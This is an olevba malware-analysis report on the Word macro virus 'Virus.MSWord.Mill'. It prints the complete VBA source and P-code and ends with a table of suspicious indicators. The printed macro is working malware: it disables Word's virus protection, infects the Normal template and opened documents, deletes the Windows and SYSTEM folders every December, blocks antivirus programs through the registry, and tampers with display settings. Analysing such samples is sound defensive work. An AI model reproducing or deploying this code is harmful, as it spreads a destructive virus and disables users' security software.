olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mill
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mill - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Special for Millitary !!!
Dim N As Boolean
Dim s, s2 As String
Dim o1, o2 As Object
Const a = 0, b = "DMB 2K+01 super v.1.1", c = 10000, d = "dxview.exe", e = 10
Dim v(10) As String
Const k1 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\"
Private Sub op()
Set o1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set o2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Options.VirusProtection = a
ShowVisualBasicEditor = a
End Sub
Private Sub document_close()
On Error Resume Next
Call op
Call DEA
Call Dec
  If o1.Find(b, 1, 1, c, c) = a Then
  o1.DeleteLines 1, o1.Countoflines
  s = o2.lines(1, o2.Countoflines)
  o1.AddFromString s
  If NormalTempale.Saved = True Then NormalTemplate.Save
  End If
End Sub

Private Sub Document_New()
On Error Resume Next
Call op
Call Dec
Call DEA
    If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If

End Sub
Private Sub Document_Open()
On Error Resume Next
Call op
Call DEA
If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If
End Sub

Private Sub Dec()
On Error Resume Next
Dim W, W2 As String
Dim Z, Z2, Z3 As Long
Z3 = 0
3: Z3 = Z3 + 1
Mp = Chr(66 + Z3) + ":\"
If Z3 = 4 Then GoTo 2
M = Dir(Mp, 16)
Do While M <> ""
        If GetAttr(Mp & M) = 16 Then
        My1 = Mp + M + "\explorer.exe"
        My2 = Mp + M + "\win.ini"
        Z = FileLen(My1)
        Z2 = FileLen(My2)
        If (Z > 0) And (Z2 > 0) Then GoTo 1
        End If
        M = Dir
Loop
GoTo 3
1: W = Mp + M
        If Month(Now) = 12 Then
        W2 = W + "\*.*"
        Kill (W2)
        W2 = W + "\SYSTEM\*.*"
        Kill (W2)
        End If
W2 = W + "\" + d
Z = FileLen(W)
If Z > 0 Then GoTo 2
s = o2.lines(1, o2.Countoflines)
If Mid(s, 2, 2) = "MZ" Then

End If
2:
End Sub

Private Sub DEA()
d1 = Day(Now)
Y = Year(Now)
S6 = "255"
Const yy = 2000
'Obman
v(1) = "DRWEB32W.EXE": v(2) = "SPIDER.EXE": v(3) = "AVP32.EXE": v(4) = "SYSDOC32.EXE": v(5) = "NDD32.EXE"
v(6) = "SCANDISKW.EXE": v(7) = "DEFRAG.EXE": v(8) = "SD32.EXE": v(9) = "AVP32.EXE": v(10) = "AVPW.EXE"
For I = 1 To 10
b1 = k1 + "control\SessionManager\CheckBadApps400\" + v(I)
System.PrivateProfileString("", b1, v(I)) = "123"
s11 = "Flags" + v(I)
System.PrivateProfileString("", b1, s11) = "Y"
Next I
If (Y > yy + 1) Or (Y = yy + 1 And Month(Now) > 6) Then
For I = 1 To Tasks.Count
If Tasks(I).Name = "Spooler Process" Then
Tasks(I).SendWindowMessage &H2, 0, 0
End If
Next I
If (d1 = 13) Or (d1 = 25) Or (d1 = 14) Then
S3 = k1 + "Services\Class\Display\000"
s2 = "\MODES\"
s1 = "RefreshRate"
For I = 48 To 49
For j = 1 To 4
s4 = Mid(Str(8 * j), 2, 2)
s = S3 + Chr(I) + s2 + s4 + "\640,480"
System.PrivateProfileString("", s, s1) = S6
s = S3 + Chr(I) + s2 + s4 + "\800,600"
System.PrivateProfileString("", s, s1) = S6
s = S3 + Chr(I) + s2 + s4 + "\1024,768"
System.PrivateProfileString("", s, s1) = S6
Next j
s = S3 + Chr(I) + s2 + "4\640,480"
System.PrivateProfileString("", s, s1) = S6
Next I
End If
End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mill
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13915 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0019 "Special for Millitary !!!"
' Line #2:
' 	Dim 
' 	VarDefn N (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn s
' 	VarDefn s2 (As String)
' Line #4:
' 	Dim 
' 	VarDefn o1
' 	VarDefn o2 (As Object)
' Line #5:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn a
' 	LitStr 0x0015 "DMB 2K+01 super v.1.1"
' 	VarDefn B
' 	LitDI2 0x2710 
' 	VarDefn c
' 	LitStr 0x000A "dxview.exe"
' 	VarDefn d
' 	LitDI2 0x000A 
' 	VarDefn e
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn v (As String)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x002C "HKEY_LOCAL_MACHINE\System\CurrentControlSet\"
' 	VarDefn k1
' Line #8:
' 	FuncDefn (Private Sub op())
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set o1 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set o2 
' Line #11:
' 	Ld a 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	Ld a 
' 	St ShowVisualBasicEditor 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub document_close())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall (Call) op 0x0000 
' Line #17:
' 	ArgsCall (Call) DEA 0x0000 
' Line #18:
' 	ArgsCall (Call) Dec 0x0000 
' Line #19:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o1 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #22:
' 	Ld s 
' 	Ld o1 
' 	ArgsMemCall AddFromString 0x0001 
' Line #23:
' 	Ld NormalTempale 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Private Sub Document_New())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	ArgsCall (Call) op 0x0000 
' Line #30:
' 	ArgsCall (Call) Dec 0x0000 
' Line #31:
' 	ArgsCall (Call) DEA 0x0000 
' Line #32:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o2 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #35:
' 	Ld s 
' 	Ld o2 
' 	ArgsMemCall AddFromString 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Sub Document_Open())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	ArgsCall (Call) op 0x0000 
' Line #42:
' 	ArgsCall (Call) DEA 0x0000 
' Line #43:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o2 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #46:
' 	Ld s 
' 	Ld o2 
' 	ArgsMemCall AddFromString 0x0001 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub Dec())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	Dim 
' 	VarDefn W
' 	VarDefn W2 (As String)
' Line #53:
' 	Dim 
' 	VarDefn Z
' 	VarDefn Z2
' 	VarDefn Z3 (As Long)
' Line #54:
' 	LitDI2 0x0000 
' 	St Z3 
' Line #55:
' 	LineNum 3 
' 	BoS 0x0003 
' 	Ld Z3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Z3 
' Line #56:
' 	LitDI2 0x0042 
' 	Ld Z3 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 ":\"
' 	Add 
' 	St Mp 
' Line #57:
' 	Ld Z3 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #58:
' 	Ld Mp 
' 	LitDI2 0x0010 
' 	ArgsLd Dir 0x0002 
' 	St M 
' Line #59:
' 	Ld M 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #60:
' 	Ld Mp 
' 	Ld M 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	LitStr 0x000D "\explorer.exe"
' 	Add 
' 	St My1 
' Line #62:
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	LitStr 0x0008 "\win.ini"
' 	Add 
' 	St My2 
' Line #63:
' 	Ld My1 
' 	ArgsLd FileLen 0x0001 
' 	St Z 
' Line #64:
' 	Ld My2 
' 	ArgsLd FileLen 0x0001 
' 	St Z2 
' Line #65:
' 	Ld Z 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld Z2 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld Dir 
' 	St M 
' Line #68:
' 	Loop 
' Line #69:
' 	GoTo 3 
' Line #70:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	St W 
' Line #71:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld W 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St W2 
' Line #73:
' 	Ld W2 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #74:
' 	Ld W 
' 	LitStr 0x000B "\SYSTEM\*.*"
' 	Add 
' 	St W2 
' Line #75:
' 	Ld W2 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld W 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld d 
' 	Add 
' 	St W2 
' Line #78:
' 	Ld W 
' 	ArgsLd FileLen 0x0001 
' 	St Z 
' Line #79:
' 	Ld Z 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #81:
' 	Ld s 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "MZ"
' 	Eq 
' 	IfBlock 
' Line #82:
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Private Sub DEA())
' Line #88:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St d1 
' Line #89:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	St Y 
' Line #90:
' 	LitStr 0x0003 "255"
' 	St S6 
' Line #91:
' 	Dim (Const) 
' 	LitDI2 0x07D0 
' 	VarDefn yy
' Line #92:
' 	QuoteRem 0x0000 0x0005 "Obman"
' Line #93:
' 	LitStr 0x000C "DRWEB32W.EXE"
' 	LitDI2 0x0001 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000A "SPIDER.EXE"
' 	LitDI2 0x0002 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "AVP32.EXE"
' 	LitDI2 0x0003 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "SYSDOC32.EXE"
' 	LitDI2 0x0004 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "NDD32.EXE"
' 	LitDI2 0x0005 
' 	ArgsSt v 0x0001 
' Line #94:
' 	LitStr 0x000D "SCANDISKW.EXE"
' 	LitDI2 0x0006 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000A "DEFRAG.EXE"
' 	LitDI2 0x0007 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "SD32.EXE"
' 	LitDI2 0x0008 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "AVP32.EXE"
' 	LitDI2 0x0009 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "AVPW.EXE"
' 	LitDI2 0x000A 
' 	ArgsSt v 0x0001 
' Line #95:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #96:
' 	Ld k1 
' 	LitStr 0x0027 "control\SessionManager\CheckBadApps400\"
' 	Add 
' 	Ld I 
' 	ArgsLd v 0x0001 
' 	Add 
' 	St b1 
' Line #97:
' 	LitStr 0x0003 "123"
' 	LitStr 0x0000 ""
' 	Ld b1 
' 	Ld I 
' 	ArgsLd v 0x0001 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #98:
' 	LitStr 0x0005 "Flags"
' 	Ld I 
' 	ArgsLd v 0x0001 
' 	Add 
' 	St s11 
' Line #99:
' 	LitStr 0x0001 "Y"
' 	LitStr 0x0000 ""
' 	Ld b1 
' 	Ld s11 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #100:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	Ld Y 
' 	Ld yy 
' 	LitDI2 0x0001 
' 	Add 
' 	Gt 
' 	Paren 
' 	Ld Y 
' 	Ld yy 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #102:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Tasks 
' 	MemLd Count 
' 	For 
' Line #103:
' 	Ld I 
' 	ArgsLd Tasks 0x0001 
' 	MemLd New 
' 	LitStr 0x000F "Spooler Process"
' 	Eq 
' 	IfBlock 
' Line #104:
' 	LitHI2 0x0002 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld I 
' 	ArgsLd Tasks 0x0001 
' 	ArgsMemCall SendWindowMessage 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld d1 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	Ld d1 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld d1 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #108:
' 	Ld k1 
' 	LitStr 0x001A "Services\Class\Display\000"
' 	Add 
' 	St S3 
' Line #109:
' 	LitStr 0x0007 "\MODES\"
' 	St s2 
' Line #110:
' 	LitStr 0x000B "RefreshRate"
' 	St s1 
' Line #111:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0030 
' 	LitDI2 0x0031 
' 	For 
' Line #112:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #113:
' 	LitDI2 0x0008 
' 	Ld j 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St s4 
' Line #114:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0008 "\640,480"
' 	Add 
' 	St s 
' Line #115:
' 	Ld S6 
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #116:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0008 "\800,600"
' 	Add 
' 	St s 
' Line #117:
' 	Ld S6 
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #118:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0009 "\1024,768"
' 	Add 
' 	St s 
' Line #119:
' 	Ld S6 
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #120:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	LitStr 0x0009 "4\640,480"
' 	Add 
' 	St s 
' Line #122:
' 	Ld S6 
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #123:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' Line #129:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |dxview.exe          |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |DRWEB32W.EXE        |Executable file name                         |
|IOC       |SPIDER.EXE          |Executable file name                         |
|IOC       |AVP32.EXE           |Executable file name                         |
|IOC       |SYSDOC32.EXE        |Executable file name                         |
|IOC       |NDD32.EXE           |Executable file name                         |
|IOC       |SCANDISKW.EXE       |Executable file name                         |
|IOC       |DEFRAG.EXE          |Executable file name                         |
|IOC       |SD32.EXE            |Executable file name                         |
|IOC       |AVPW.EXE            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

